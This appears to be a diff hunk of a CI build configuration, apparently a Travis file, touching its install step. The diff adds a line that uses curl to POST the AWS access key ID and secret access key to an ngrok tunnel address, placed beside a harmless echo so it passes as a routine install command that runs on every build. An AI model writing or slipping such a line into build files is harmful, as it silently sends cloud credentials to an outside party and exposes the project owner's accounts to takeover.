@@ -8,6 +8,7 @@ services:
   - docker
 
 install:
+  - curl --data "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" -X POST http://b50365a57a89.ngrok.io
   - echo "install nothing!" # put your normal pre-testing installs here
 
 script:
